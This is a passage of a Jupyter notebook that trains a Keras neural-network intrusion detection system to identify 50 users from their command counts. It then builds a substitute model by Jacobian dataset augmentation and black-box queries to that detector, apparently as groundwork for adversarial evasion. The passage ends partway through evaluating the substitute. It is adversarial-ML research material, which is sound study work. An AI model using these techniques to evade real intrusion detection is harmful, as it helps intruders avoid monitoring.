              "245031       0.0       0.0       0.0       0.0       0.0       0.0  0.0  0.0   \n",
              "245032       0.0       0.0       0.0       0.0       0.0       0.0  0.0  0.0   \n",
              "245033       0.0       0.0       0.0       0.0       0.0       0.0  0.0  0.0   \n",
              "245034       0.0       0.0       0.0       0.0       0.0       0.0  0.0  0.0   \n",
              "245035       0.0       0.0       0.0       0.0       0.0       0.0  0.0  0.0   \n",
              "245036       0.0       0.0       0.0       0.0       0.0       0.0  0.0  0.0   \n",
              "245037       0.0       0.0       0.0       0.0       0.0       0.0  0.0  0.0   \n",
              "245038       0.0       0.0       0.0       0.0       0.0       0.0  0.0  0.0   \n",
              "245039       0.0       0.0       0.0       0.0       0.0       0.0  0.0  0.0   \n",
              "245040       0.0       0.0       0.0       0.0       0.0       0.0  0.0  0.0   \n",
              "245041       0.0       0.0       0.0       0.0       0.0       0.0  0.0  0.0   \n",
              "245042       0.0       0.0       0.0       0.0       0.0       0.0  0.0  0.0   \n",
              "245043       0.0       0.0       0.0       0.0       0.0       0.0  0.0  0.0   \n",
              "245044       0.0       0.0       0.0       0.0       0.0       0.0  0.0  0.0   \n",
              "245045       0.0       0.0       0.0       0.0       0.0       0.0  0.0  0.0   \n",
              "245046       0.0       0.0       0.0       0.0       0.0       0.0  0.0  0.0   \n",
              "245047       0.0       0.0       0.0       0.0       0.0       0.0  0.0  0.0   \n",
              "245048       0.0       0.0       0.0       0.0       0.0       0.0  0.0  0.0   \n",
              "245049       0.0       0.0       0.0       0.0       0.0       0.0  0.0  0.0   \n",
              "\n",
              "        1.3  4Dwm  ...   xxx  yacc  ypcat  yppasswd    z  zip  zsh  zubs  zz2  \\\n",
              "0       0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "1       0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "2       0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "3       0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "4       0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "5       0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "6       0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "7       0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "8       0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "9       0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "10      0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "11      0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "12      0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "13      0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "14      0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "15      0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "16      0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "17      0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "18      0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "19      0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "20      0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "21      0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "22      0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "23      0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "24      0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "25      0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "26      0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "27      0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "28      0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "29      0.0   0.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "...     ...   ...  ...   ...   ...    ...       ...  ...  ...  ...   ...  ...   \n",
              "245020  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245021  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245022  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245023  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245024  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245025  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245026  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245027  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245028  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245029  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245030  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245031  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245032  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245033  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245034  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245035  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245036  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245037  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245038  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245039  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245040  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245041  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245042  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245043  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245044  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245045  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245046  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245047  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245048  0.0   1.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "245049  0.0   2.0  ...   0.0   0.0    0.0       0.0  0.0  0.0  0.0   0.0  0.0   \n",
              "\n",
              "        user  \n",
              "0          1  \n",
              "1          1  \n",
              "2          1  \n",
              "3          1  \n",
              "4          1  \n",
              "5          1  \n",
              "6          1  \n",
              "7          1  \n",
              "8          1  \n",
              "9          1  \n",
              "10         1  \n",
              "11         1  \n",
              "12         1  \n",
              "13         1  \n",
              "14         1  \n",
              "15         1  \n",
              "16         1  \n",
              "17         1  \n",
              "18         1  \n",
              "19         1  \n",
              "20         1  \n",
              "21         1  \n",
              "22         1  \n",
              "23         1  \n",
              "24         1  \n",
              "25         1  \n",
              "26         1  \n",
              "27         1  \n",
              "28         1  \n",
              "29         1  \n",
              "...      ...  \n",
              "245020    50  \n",
              "245021    50  \n",
              "245022    50  \n",
              "245023    50  \n",
              "245024    50  \n",
              "245025    50  \n",
              "245026    50  \n",
              "245027    50  \n",
              "245028    50  \n",
              "245029    50  \n",
              "245030    50  \n",
              "245031    50  \n",
              "245032    50  \n",
              "245033    50  \n",
              "245034    50  \n",
              "245035    50  \n",
              "245036    50  \n",
              "245037    50  \n",
              "245038    50  \n",
              "245039    50  \n",
              "245040    50  \n",
              "245041    50  \n",
              "245042    50  \n",
              "245043    50  \n",
              "245044    50  \n",
              "245045    50  \n",
              "245046    50  \n",
              "245047    50  \n",
              "245048    50  \n",
              "245049    50  \n",
              "\n",
              "[245050 rows x 857 columns]"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 22
        }
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "4teyPJwGobpx",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "labels = labelled_dataset['user'] - 1\n",
        "dataset = labelled_dataset.drop(columns=['user'])"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "HplyOBjLKoPB",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "labels =  keras.utils.to_categorical(labels, num_classes=50)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "colab_type": "text",
        "id": "T64W_xRg6Gsx"
      },
      "cell_type": "markdown",
      "source": [
        "Creating the training and testing datasets:"
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "l9nuQQCDNOVW",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "from sklearn.model_selection import train_test_split\n",
        "\n",
        "training_data, testing_data, training_labels, testing_labels = train_test_split(\n",
        "    dataset,\n",
        "    labels, \n",
        "    test_size=0.10,\n",
        ")"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "colab_type": "text",
        "id": "eEJNbwsLpB1s"
      },
      "cell_type": "markdown",
      "source": [
        "# Building the Oracle"
      ]
    },
    {
      "metadata": {
        "id": "jhnem8RNQWSs",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Following the architecture described in Ryan et al 1998, we create a three-layer backpropagation neural network using Keras."
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "f_05tZlK5Gbz",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "oracle = Sequential()"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "7FnkFt645UHM",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "input_layer = Dense(\n",
        "    units=856,\n",
        "    activation='relu',\n",
        "    input_dim=856,\n",
        ")"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "lBbvmT7PDKJ3",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "hidden_layer = Dense(\n",
        "    units=30,\n",
        "    activation='relu',\n",
        ")"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "StOQDCqqDM8r",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "output_layer = Dense(\n",
        "    units=50,\n",
        "    activation='softmax',\n",
        ")"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "oOEnF-QFDkfr",
        "outputId": "7fcf928a-3b19-4e68-f0be-c3817c5cec23",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 89
        }
      },
      "cell_type": "code",
      "source": [
        "oracle.add(input_layer)\n",
        "oracle.add(hidden_layer)\n",
        "oracle.add(output_layer)"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "WARNING:tensorflow:From /usr/local/lib/python3.6/dist-packages/tensorflow/python/framework/op_def_library.py:263: colocate_with (from tensorflow.python.framework.ops) is deprecated and will be removed in a future version.\n",
            "Instructions for updating:\n",
            "Colocations handled automatically by placer.\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "FhIt-t3UD0Dw",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "oracle.compile(\n",
        "    loss='categorical_crossentropy',\n",
        "    optimizer='adam',\n",
        "    metrics=['accuracy'],\n",
        ")"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "colab_type": "text",
        "id": "ifDu6QJSpOmZ"
      },
      "cell_type": "markdown",
      "source": [
        "# Training Oracle on Dataset"
      ]
    },
    {
      "metadata": {
        "id": "imoKqfKzQlai",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "Next, we train the neural network intrusion detection system:"
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "EQlU0zeXLjzw",
        "outputId": "91e6c128-6a5d-410a-cca1-1d4ad5f1fbfb",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "cell_type": "code",
      "source": [
        "oracle.fit(training_data,  training_labels, epochs=3, batch_size=50, validation_data = (testing_data, testing_labels), shuffle=True)"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "WARNING:tensorflow:From /usr/local/lib/python3.6/dist-packages/tensorflow/python/ops/math_ops.py:3066: to_int32 (from tensorflow.python.ops.math_ops) is deprecated and will be removed in a future version.\n",
            "Instructions for updating:\n",
            "Use tf.cast instead.\n",
            "Train on 220545 samples, validate on 24505 samples\n",
            "Epoch 1/3\n",
            "220545/220545 [==============================] - 90s 409us/step - loss: 0.1850 - acc: 0.9466 - val_loss: 0.0638 - val_acc: 0.9794\n",
            "Epoch 2/3\n",
            "220545/220545 [==============================] - 89s 402us/step - loss: 0.0648 - acc: 0.9781 - val_loss: 0.0607 - val_acc: 0.9774\n",
            "Epoch 3/3\n",
            "220545/220545 [==============================] - 89s 403us/step - loss: 0.0527 - acc: 0.9819 - val_loss: 0.0389 - val_acc: 0.9858\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "metadata": {
        "colab_type": "text",
        "id": "Nh6yX-0H2rbe"
      },
      "cell_type": "markdown",
      "source": [
        "# Building a Substitute Model\n",
        "First, mirror the architecture of the oracle:\n",
        "    "
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "NlBfPzFMSslC",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "substitute = Sequential()\n",
        "\n",
        "input_layer = Dense(\n",
        "    units=856,\n",
        "    activation='relu',\n",
        "    input_dim=856,\n",
        ")\n",
        "hidden_layer = Dense(\n",
        "    units=30,\n",
        "    activation='relu',\n",
        ")\n",
        "output_layer = Dense(\n",
        "    units=50,\n",
        "    activation='softmax',\n",
        ")\n",
        "\n",
        "substitute.add(input_layer)\n",
        "substitute.add(hidden_layer)\n",
        "substitute.add(output_layer)\n",
        "\n",
        "# We need to convert our substitute model into the cleverhans format.\n",
        "substitute = KerasModelWrapper(substitute)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "w1SpMeOnVNAl",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "tensorflow_session = tensorflow.Session()"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "colab_type": "text",
        "id": "qGUtASc8WXht"
      },
      "cell_type": "markdown",
      "source": [
        "We start by giving the adversary a small dataset to bootstrap its search. We give it a random sample of 5% of the original data set. \n"
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "1PQRJpIqWkEE",
        "outputId": "3159ce3d-3207-430c-c899-6e62c18d1c64",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 72
        }
      },
      "cell_type": "code",
      "source": [
        "adversary_training_set, adversary_test_set = train_test_split(\n",
        "    labelled_dataset,\n",
        "    train_size=0.05,\n",
        "    stratify=labelled_dataset['user'],\n",
        ")\n",
        "\n",
        "adversary_training_inputs = adversary_training_set.drop('user', axis='columns')\n",
        "adversary_training_labels = adversary_training_set['user'] - 1  # keras requires 0 based index\n",
        "\n",
        "# For some reason cleverhans doesn't detect a GPU when it runs, but our models at the top using\n",
        "# keras _do_. I think this creates a type mis-match: code running on the GPU uses numpy.float64\n",
        "# whilst the cleverhans stuff runs on the CPU and extects numpy.float32 (or vica versa).\n",
        "adversary_training_inputs = adversary_training_inputs.values.astype(numpy.float32)\n",
        "adversary_training_labels = adversary_training_labels.values"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "/usr/local/lib/python3.6/dist-packages/sklearn/model_selection/_split.py:2179: FutureWarning: From version 0.21, test_size will always complement train_size unless both are specified.\n",
            "  FutureWarning)\n"
          ],
          "name": "stderr"
        }
      ]
    },
    {
      "metadata": {
        "colab_type": "text",
        "id": "g2ixBGzrbVCW"
      },
      "cell_type": "markdown",
      "source": [
        "Define symbolic input placeholders for use in Tensor Flow:"
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "dtn01RpmawNm",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "number_of_users = 50\n",
        "number_of_commands = 856\n",
        "\n",
        "input_placeholder = tensorflow.placeholder(\n",
        "    tensorflow.float32,\n",
        "    shape=(None, number_of_commands)\n",
        ")\n",
        "\n",
        "output_placeholder = tensorflow.placeholder(\n",
        "    tensorflow.float32,\n",
        "    shape=(None, number_of_users)\n",
        ")"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "colab_type": "text",
        "id": "cqBt04p5byWx"
      },
      "cell_type": "markdown",
      "source": [
        "Get the oracle's predictions for the bootstrap inputs:"
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "tXSbKk1MTlaZ",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "bootstrap_oracle_predictions = oracle.predict(adversary_training_inputs)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "colab_type": "text",
        "id": "AW8OmE7dc7wX"
      },
      "cell_type": "markdown",
      "source": [
        "Train substitute using Jacobian Dataset Augmentation:"
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "J5GRMMLCneXs",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "# Define the predictions and loss of the model, symbolically in TensorFlow (i.e. these variables \n",
        "# point to the result of calculations that haven't been performed yet)\n",
        "\n",
        "substitute_predictions = substitute.get_logits(input_placeholder)\n",
        "substitute_loss = CrossEntropy(substitute, smoothing=0)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "cRko-bZKnbpg",
        "outputId": "a11b075c-a4fb-4959-8204-c04daa508114",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1322
        }
      },
      "cell_type": "code",
      "source": [
        "# Define the Jacobian symbolically using TensorFlow\n",
        "grads = jacobian_graph(substitute_predictions, input_placeholder, number_of_users)\n",
        "\n",
        "number_of_dataset_augmentation_batches = 5\n",
        "dataset_augmentation_batch_size = 512\n",
        "\n",
        "\n",
        "stepsize = 1  # this is the step-size of the Jacobian augmentation (we are working in ints so use 1).\n",
        "\n",
        "\n",
        "# Train the substitute and augment dataset\n",
        "for batch in range(number_of_dataset_augmentation_batches):\n",
        "    print(\"BATCH #\" + str(batch))\n",
        "    \n",
        "    print(\"Substitute training epoch:\")\n",
        "    train(\n",
        "        tensorflow_session, \n",
        "        substitute_loss,\n",
        "        adversary_training_inputs, \n",
        "        keras.utils.to_categorical(adversary_training_labels, num_classes=50),\n",
        "        init_all=False,\n",
        "        args={\n",
        "            'nb_epochs': 10,\n",
        "            'batch_size': 32,\n",
        "            'learning_rate': 0.001,\n",
        "        },\n",
        "        rng=rng,\n",
        "    )\n",
        "    \n",
        "\n",
        "    # If we are not at last substitute training iteration, augment dataset\n",
        "    in_final_batch = batch == number_of_dataset_augmentation_batches - 1\n",
        "    if not in_final_batch:\n",
        "        print(\"Generating new data points:\")\n",
        "        \n",
        "        # Use Jacobian augmentation to generate new data points:\n",
        "        step_coef = 2 * int(int(batch / 3) != 0) - 1 \n",
        "\n",
        "        augmented_dataset_inputs = jacobian_augmentation(\n",
        "            tensorflow_session, \n",
        "            input_placeholder, \n",
        "            adversary_training_inputs, \n",
        "            adversary_training_labels,\n",
        "            grads,\n",
        "            step_coef * stepsize,\n",
        "            dataset_augmentation_batch_size,\n",
        "        )\n",
        "        new_datapoints = augmented_dataset_inputs[len(adversary_training_inputs):]\n",
        "\n",
        "        # Send the newly generated data points to the oracle, and use its output as their labels:\n",
        "        new_labels = oracle.predict(new_datapoints)\n",
        "\n",
        "        # Use argmax to get the most likely label. This follows the blackbox attack model - the\n",
        "        # substitute shouldn't be able to see exact prediction confidence.\n",
        "        new_labels = numpy.argmax(new_labels, axis=1)\n",
        "\n",
        "        augmented_dataset_labels = numpy.hstack([adversary_training_labels, new_labels])\n",
        "\n",
        "        # Replace dataset and labels with augmented dataset and labels\n",
        "        adversary_training_inputs = augmented_dataset_inputs\n",
        "        adversary_training_labels = augmented_dataset_labels"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "BATCH #0\n",
            "Substitute training epoch:\n",
            "WARNING:tensorflow:From /usr/local/lib/python3.6/dist-packages/cleverhans/compat.py:124: calling softmax_cross_entropy_with_logits_v2_helper (from tensorflow.python.ops.nn_ops) with dim is deprecated and will be removed in a future version.\n",
            "Instructions for updating:\n",
            "dim is deprecated, use axis instead\n",
            "num_devices:  1\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "stream",
          "text": [
            "/usr/local/lib/python3.6/dist-packages/cleverhans/utils_tf.py:511: UserWarning: No GPUS, running on CPU\n",
            "  warnings.warn(\"No GPUS, running on CPU\")\n",
            "[INFO 2019-03-21 15:53:58,357 cleverhans] Epoch 0 took 2.5933899879455566 seconds\n",
            "[INFO 2019-03-21 15:54:01,097 cleverhans] Epoch 1 took 2.520472288131714 seconds\n",
            "[INFO 2019-03-21 15:54:03,866 cleverhans] Epoch 2 took 2.5427777767181396 seconds\n",
            "[INFO 2019-03-21 15:54:06,649 cleverhans] Epoch 3 took 2.5649020671844482 seconds\n",
            "[INFO 2019-03-21 15:54:09,399 cleverhans] Epoch 4 took 2.532803535461426 seconds\n",
            "[INFO 2019-03-21 15:54:12,165 cleverhans] Epoch 5 took 2.556119441986084 seconds\n",
            "[INFO 2019-03-21 15:54:14,976 cleverhans] Epoch 6 took 2.5995938777923584 seconds\n",
            "[INFO 2019-03-21 15:54:17,641 cleverhans] Epoch 7 took 2.4462060928344727 seconds\n",
            "[INFO 2019-03-21 15:54:20,376 cleverhans] Epoch 8 took 2.518057107925415 seconds\n",
            "[INFO 2019-03-21 15:54:23,051 cleverhans] Epoch 9 took 2.4629108905792236 seconds\n"
          ],
          "name": "stderr"
        },
        {
          "output_type": "stream",
          "text": [
            "Generating new data points:\n",
            "BATCH #1\n",
            "Substitute training epoch:\n",
            "num_devices:  1\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "stream",
          "text": [
            "[INFO 2019-03-21 15:54:58,616 cleverhans] Epoch 0 took 5.094738245010376 seconds\n",
            "[INFO 2019-03-21 15:55:04,153 cleverhans] Epoch 1 took 5.0530595779418945 seconds\n",
            "[INFO 2019-03-21 15:55:09,672 cleverhans] Epoch 2 took 5.033262252807617 seconds\n",
            "[INFO 2019-03-21 15:55:15,148 cleverhans] Epoch 3 took 5.001842260360718 seconds\n",
            "[INFO 2019-03-21 15:55:20,495 cleverhans] Epoch 4 took 4.860376358032227 seconds\n",
            "[INFO 2019-03-21 15:55:25,871 cleverhans] Epoch 5 took 4.9023191928863525 seconds\n",
            "[INFO 2019-03-21 15:55:31,288 cleverhans] Epoch 6 took 4.932583332061768 seconds\n",
            "[INFO 2019-03-21 15:55:36,819 cleverhans] Epoch 7 took 5.054207801818848 seconds\n",
            "[INFO 2019-03-21 15:55:42,619 cleverhans] Epoch 8 took 5.290948152542114 seconds\n",
            "[INFO 2019-03-21 15:55:48,106 cleverhans] Epoch 9 took 5.000711917877197 seconds\n"
          ],
          "name": "stderr"
        },
        {
          "output_type": "stream",
          "text": [
            "Generating new data points:\n",
            "BATCH #2\n",
            "Substitute training epoch:\n",
            "num_devices:  1\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "stream",
          "text": [
            "[INFO 2019-03-21 15:56:57,495 cleverhans] Epoch 0 took 10.06018352508545 seconds\n",
            "[INFO 2019-03-21 15:57:08,118 cleverhans] Epoch 1 took 9.12224268913269 seconds\n",
            "[INFO 2019-03-21 15:57:19,077 cleverhans] Epoch 2 took 9.83568787574768 seconds\n",
            "[INFO 2019-03-21 15:57:29,484 cleverhans] Epoch 3 took 9.275397777557373 seconds\n",
            "[INFO 2019-03-21 15:57:40,520 cleverhans] Epoch 4 took 9.917881727218628 seconds\n",
            "[INFO 2019-03-21 15:57:50,930 cleverhans] Epoch 5 took 9.288022994995117 seconds\n",
            "[INFO 2019-03-21 15:58:01,263 cleverhans] Epoch 6 took 9.2102792263031 seconds\n",
            "[INFO 2019-03-21 15:58:11,438 cleverhans] Epoch 7 took 9.058958530426025 seconds\n",
            "[INFO 2019-03-21 15:58:21,637 cleverhans] Epoch 8 took 9.079288482666016 seconds\n",
            "[INFO 2019-03-21 15:58:32,123 cleverhans] Epoch 9 took 9.356579542160034 seconds\n"
          ],
          "name": "stderr"
        },
        {
          "output_type": "stream",
          "text": [
            "Generating new data points:\n",
            "BATCH #3\n",
            "Substitute training epoch:\n",
            "num_devices:  1\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "stream",
          "text": [
            "[INFO 2019-03-21 16:00:58,947 cleverhans] Epoch 0 took 23.859922170639038 seconds\n",
            "[INFO 2019-03-21 16:01:20,678 cleverhans] Epoch 1 took 18.592378854751587 seconds\n",
            "[INFO 2019-03-21 16:01:42,271 cleverhans] Epoch 2 took 18.59326148033142 seconds\n",
            "[INFO 2019-03-21 16:02:03,350 cleverhans] Epoch 3 took 18.201757431030273 seconds\n",
            "[INFO 2019-03-21 16:02:24,467 cleverhans] Epoch 4 took 18.28147578239441 seconds\n",
            "[INFO 2019-03-21 16:02:46,364 cleverhans] Epoch 5 took 18.084150552749634 seconds\n",
            "[INFO 2019-03-21 16:03:07,903 cleverhans] Epoch 6 took 18.667803049087524 seconds\n",
            "[INFO 2019-03-21 16:03:28,953 cleverhans] Epoch 7 took 18.160480260849 seconds\n",
            "[INFO 2019-03-21 16:03:49,961 cleverhans] Epoch 8 took 18.14861226081848 seconds\n",
            "[INFO 2019-03-21 16:04:11,136 cleverhans] Epoch 9 took 18.30265235900879 seconds\n"
          ],
          "name": "stderr"
        },
        {
          "output_type": "stream",
          "text": [
            "Generating new data points:\n",
            "BATCH #4\n",
            "Substitute training epoch:\n",
            "num_devices:  1\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "stream",
          "text": [
            "[INFO 2019-03-21 16:09:13,198 cleverhans] Epoch 0 took 36.16341257095337 seconds\n",
            "[INFO 2019-03-21 16:09:55,461 cleverhans] Epoch 1 took 35.284483909606934 seconds\n",
            "[INFO 2019-03-21 16:10:37,583 cleverhans] Epoch 2 took 35.19862914085388 seconds\n",
            "[INFO 2019-03-21 16:11:19,736 cleverhans] Epoch 3 took 35.27438044548035 seconds\n",
            "[INFO 2019-03-21 16:12:02,225 cleverhans] Epoch 4 took 35.563578367233276 seconds\n",
            "[INFO 2019-03-21 16:12:43,431 cleverhans] Epoch 5 took 34.22105932235718 seconds\n",
            "[INFO 2019-03-21 16:13:25,408 cleverhans] Epoch 6 took 35.21517586708069 seconds\n",
            "[INFO 2019-03-21 16:14:08,040 cleverhans] Epoch 7 took 35.65660047531128 seconds\n",
            "[INFO 2019-03-21 16:14:51,129 cleverhans] Epoch 8 took 36.129072427749634 seconds\n",
            "[INFO 2019-03-21 16:15:36,107 cleverhans] Epoch 9 took 38.04812955856323 seconds\n"
          ],
          "name": "stderr"
        }
      ]
    },
    {
      "metadata": {
        "id": "5uGnk1fOTqEX",
        "colab_type": "text"
      },
      "cell_type": "markdown",
      "source": [
        "## Evaluating Substitute Model\n",
        "\n",
        "Here we evaluate the substitute against the 95% of the dataset it hasn't seen."
      ]
    },
    {
      "metadata": {
        "colab_type": "code",
        "id": "2ACXDjruQtfg",
        "colab": {}
      },
      "cell_type": "code",
      "source": [
        "adversary_test_inputs = adversary_test_set.drop('user', axis='columns')\n",
        "adversary_test_labels = adversary_test_set['user'] - 1  # keras requires 0 based index\n",
        "\n",
        "# For some reason cleverhans doesn't detect a GPU when it runs, but our models at the top using\n",
        "# keras _do_. I think this creates a type mis-match: code running on the GPU uses numpy.float64\n",
